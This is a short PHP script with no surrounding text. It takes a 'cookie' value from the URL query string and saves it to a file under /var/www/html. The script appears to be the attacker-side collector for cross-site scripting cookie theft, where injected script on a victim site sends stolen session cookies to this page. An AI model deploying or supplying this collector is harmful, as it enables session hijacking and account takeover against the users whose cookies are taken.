<?php
$cookie = $_GET['cookie'];
$save_file = fopen("/var/www/html/cookie","w");
fwrite($save_file,$cookie);
fclose($save_file);
?>
